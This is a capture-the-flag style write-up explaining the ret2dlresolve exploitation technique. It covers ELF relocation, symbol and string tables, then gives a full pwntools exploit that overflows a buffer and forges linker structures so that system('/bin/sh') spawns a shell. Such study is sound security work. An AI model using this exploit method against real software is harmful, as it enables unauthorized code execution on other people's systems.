# ret2dlresolve

The purpose of this technique is to resolve any function symbol from libc (or any other dynamically loaded library) at runtime even if our ELF object does not import it. The technique does not require knowing the version of the remote library nor does it require leaking an address in order to find the base address of the library.

* Does not require knowing the exact version of the library that the remote uses.
* Does not require leak primitive to find the base address of the library.
* Does not require the target function to have been imported in the GOT table.

## requirements

* Code execution control (`%rip`)
* Stack control to write ROP chain
* Writeable memory area
  * Preferably (and test only with) global data area

## results

* Arbitrary function call to any function present in any loaded arbitrary library
  * e.g. Invoke `execve("/bin/sh", NULL, NULL)` from glibc to spawn a shell.

## Technique breakdown

The idea is to invoke `_dl_runtime_resolve(link_map, rel_offset)` with a fake data that we control. We assume that the reader is familiar with how the `.got` and `.got.plt` entries work and how lazy binding is used to populate the `.got.plt` entries.

Before presenting the technique, we first have to examine some interesting ELF sections and understand how when we invoke a library function for the first time, the linker resolves that symbol to an address, populates `.got.plt`, and then invokes that function. The sections that we will look at are `SYMTAB` (`.dynsym`), `STRTAB` (`.dynstr`), and `JMPREL` (`.rela.plt`).

```bash
nikos@laptop:~/babyrop-techniques$ readelf -d babyrop 

Dynamic section at offset 0x2e10 contains 24 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x0000000000000005 (STRTAB)             0x4003d0
 0x0000000000000006 (SYMTAB)             0x400328
 0x0000000000000017 (JMPREL)             0x4004d8
```

### `JMPREL` (`.rel.plt`)

This section stores a table called **Relocation table**. The entries of this table describe where to find information for the symbol that needs to be resolved. These entries have the following structure ([See here for detailed source](https://github.com/google/bloaty/blob/master/third_party/freebsd_elf/elf64.h)):

```C
typedef uint64_t Elf64_Addr  ;
typedef uint64_t Elf64_Xword ;
typedef int64_t  Elf64_Sxword;

typedef struct elf64_rela {
   Elf64_Addr r_offset    ;   // Address in GOT table. Location to apply the relocation action
   Elf64_Xword r_info     ;   // The symbol table index (ELF64_R_SYM) and the type of relocation (ELF64_R_TYPE). | ELF64_R_SYM (32-bit) | ELF64_R_TYPE (32-bit) |
                              // symbol table resides in .symtab section
   Elf64_Sxword r_addend  ;   // A constant addend used to compute the relocatable field value. We want it 0 for the exploit.
} Elf64_Rela; //struct is 24 bytes in size
#define ELF64_R_SYM(info)             ((info)>>32)
#define ELF64_R_TYPE(info)	((info) & 0xffffffff)
```

For example:

```bash
nikos@laptop:~/babyrop-techniques$ readelf -r babyrop 

Relocation section '.rela.plt' at offset 0x4d8 contains 2 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000404018  000200000007 R_X86_64_JUMP_SLO 0000000000000000 write@GLIBC_2.2.5 + 0
000000404020  000500000007 R_X86_64_JUMP_SLO 0000000000000000 gets@GLIBC_2.2.5 + 0
```

### `STRTAB` (`.dynstr`)

This section is very simple and stores an array of null-terminated strings. Each entry is of type `char [X+1]` and represents the name of the symbol that needs to be resolved, where `X` is the length of the symbol's name. Note that all the names are null-terminated and layed out sequentially in memory as demonstrated bellow.

```bash
nikos@laptop:~/babyrop-techniques$ readelf -p .dynstr babyrop

String dump of section '.dynstr':
  [     0]  \x00
  [     1]  gets
  [     6]  __libc_start_main
  [    18]  write
  [    1e]  libc.so.6
  [    28]  GLIBC_2.2.5
  [    34]  _ITM_deregisterTMCloneTable
  [    50]  __gmon_start__
  [    5f]  _ITM_registerTMCloneTable
```

### `SYMTAB` (`.dynsym`)

This section holds a table called **Dynamic Symbol Table**. This table holds relevant symbol information for dynamic symbols. From this table, we are only interested in one field from each entry and assume all the others to be zero.

```c
typedef uint32_t Elf64_Word;
typedef struct elf64_Sym {
	Elf64_Word	st_name;	  // Offset in .dynstr section that points to the name of the symbol.
  /* ... */
} Elf64_Sym; //struct is 24 bytes in size
```

Some example entries are:

```bash
nikos@laptop:~/babyrop-techniques$ readelf --dyn-syms babyrop

Symbol table '.dynsym' contains 7 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.2.5 (2)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
     4: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.2.5 (2)
(output truncated)
```

### Putting it all together

Now it is time to see how theses three sections are combined to resolve a single symbol. Let's see how `write` gets resolved when it is invoked for the first time. Assume that we call `write(0, buf, 0x100)`.

```asm
0x40114f <main+25>        call   0x401030 <write@plt>
  0x401030 <write@plt+0>    jmp    QWORD PTR [rip+0x2fe2]   # jmp [write@got.plt]. Will jump to the next instruction as write() was invoked for the first time.
  0x401036 <write@plt+6>    push   0x0       # Index in Relocation table
  0x40103b <write@plt+11>   jmp    0x401020  # First stub function in .plt. Will jump us to the linker
    0x401020  push   QWORD PTR [rip+0x2fe2]    # push [0x404008]. "link_map" in .got.plt
    0x401026  jmp    QWORD PTR [rip+0x2fe4]    # jmp  [0x404010]. Jumps to function "_dl_runtime_resolve()" 
                                               #                   in /usr/lib/x86_64-linux-gnu/ld-2.31.so    
```

So the above code invokes `_dl_runtime_resolve(link_map, 0x00)`. This function will take care to resolve the `write` symbol and then invoke it with whatever arguments the caller had set up. Let's examine how it works.

```c
_dl_runtime_resolve(link_map, rel_offset) {
    //From the index `rel_offset` in the Relocation table (.rela.plt), extract the name of the symbol that needs to be resolved (e.g. "write")

    Elf64_Rela *rel_entry = JMPREL + rel_offset;  //kinda like metadata for .got.plt entries.
    Elf64_Sym *sym_entry = SYMTAB[ ELF64_R_SYM(rel_entry->r_info) ]; //lookup symbol in symbol table. ACCESS MUST BE ALIGNED to 24-byte boundary (24 bytes == sizeof(Elf64_Sym)).

    char *sym_name = STRTAB + sym_entry->st_name;
    _search_for_symbol_(link_map, sym_name); // Works kinda like dlsym()

    // invoke initial write call now that symbol is resolved
    write(0, buf, 0x100);
}
```

## Exploit - Challenge solution

So, we want to create our own fake table entries `Elf64_Sym` and `Elf64_Rela` in order to make the linker to resolve `system` and then invoke it like`system("/bin/sh")`. We create these fake data structures according to the following image.

![memory-layout](memory-layout.jpg)

Next, we create the python solution.

```python
from pwn import *

exe = '../babyrop'
context.binary = exe # Infer target architecture, bit-with, and endianness from a binary file.
elfexe = ELF(exe)

rdi_gadget = 0x4011d3
main = 0x00401136
_dl_runtime_resolve = elfexe.get_section_by_name('.plt').header.sh_addr # stub for _dl_runtime_resolve() is always the first function found in the .plt section

assert(elfexe.address - elfexe.load_addr == 0)
JMPREL = elfexe.dynamic_value_by_tag('DT_JMPREL')
SYMTAB = elfexe.dynamic_value_by_tag('DT_SYMTAB')
STRTAB = elfexe.dynamic_value_by_tag('DT_STRTAB')

write_back_area   = 0x404800 # Area in which _dl_runtime_resolve() will write back the resolved address
writeable_address = 0x404f10 # Fake stack area. Must be aligned to 16-byte boundary otherwise we will fail due to moveaps. This is our $rsp

# Set buf to point to writeable_address
io.recvuntil(b'Your name: ')
payload  = b'A'*0x40
payload += p64(writeable_address + 0x40) # rbp
payload += p64(main + 0x1e) # ret to LEA rbp-0x40
payload += b'\n'
io.send(payload)

# Do some real sorcery here.
# 1. Set up $rdi for the system("/bin/sh") call
# 2. Create fake struct elf64_rela
# 3. Create fake struct elf64_Sym
# 4. Invoke _dl_runtime_resolve() with our fake data
rel_entry_addr = writeable_address + 0x80
rel_offset = ( rel_entry_addr - JMPREL ) // 24
assert(( rel_entry_addr - JMPREL ) % 24 == 0) # rel_offset must be 24-byte aligned
assert(JMPREL + rel_offset*24 == rel_entry_addr)

sym_entry_addr = (rel_entry_addr + 24)
symtab_idx = ( sym_entry_addr - SYMTAB ) // 24
assert(( sym_entry_addr - SYMTAB) % 24 == 0) # symtab_idx must be 24-byte aligned
assert(SYMTAB + symtab_idx*24 == sym_entry_addr)

r_info = (symtab_idx << 32) | (0x7)
system_str_addr = writeable_address + 0xb0
bin_sh_str_adr  = writeable_address + 0xb8
st_name = system_str_addr - STRTAB
assert(STRTAB + st_name == system_str_addr)

log.info('writeable_address: ' + hex(writeable_address))
log.info('rel_offset: ' + hex(rel_offset))
log.info('  - rel_entry expected at : ' + hex(rel_entry_addr))
log.info('symtab_idx: ' + hex(symtab_idx))
log.info('  - st_name for "system" expected at : ' + hex(sym_entry_addr))
log.info('  - value expected to be             : ' + hex(st_name))
log.info('expected "system"  string at: ' + hex(system_str_addr))
log.info('expected "/bin/sh" string at: ' + hex(bin_sh_str_adr))

# Construct the described payload
payload  = b''
payload += b'B'*0x40 # padding since we have to write our stuff bellow the return address
payload += b'C'*0x08 # rbp
payload += p64(rdi_gadget)          # ret. Return to gadget: pop rdi; ret;
payload += p64(bin_sh_str_adr)      # rdi = "/bin/sh\x00"
payload += p64(_dl_runtime_resolve) # ret. Return to stub for _dl_runtime_resolve() (It will also push the 1st argument when executed)
payload += p64(rel_offset)          # 2nd arg of  _dl_runtime_resolve().
payload += b'D'*0x08                # return address of _dl_runtime_resolve(). It shouldn't return as it will invoke system()
payload += b'E'*0x10                # padding to be aligned on 24-byte boundary
payload += (                # Elf64_Rela rel_entry
    p64(write_back_area)     + # r_offset. Value does not matter as long as we can write there.
    p64(r_info)             + # r_info
    p64(0x0000000000000000)   # r_addend
)
payload += (            # Elf64_Sym sym_entry
    p64(st_name) +      # st_name
    b'\x00'*16
)
payload += b'system\x00\x00'
payload += b'/bin/sh\x00'
payload += b'\n'
io.send(payload)

io.interactive()
io.close()
```

### Constraints

During the writing of our solution, the following constraints had to be met:

* `rel_entry->r_offset` must be writable it is the area where the resolved address will be written.
* `rel_entry->r_info & 0xffffffff == 0x07`. Lower 4 bytes of `r_info` must be equal to `0x07`.
* `rel_entry->r_addend` Must be zero.
* Fields in `sym_entry` except `st_name` must be zero.
* 24-byte alignment for `rel_entry` and for `sym_entry`.
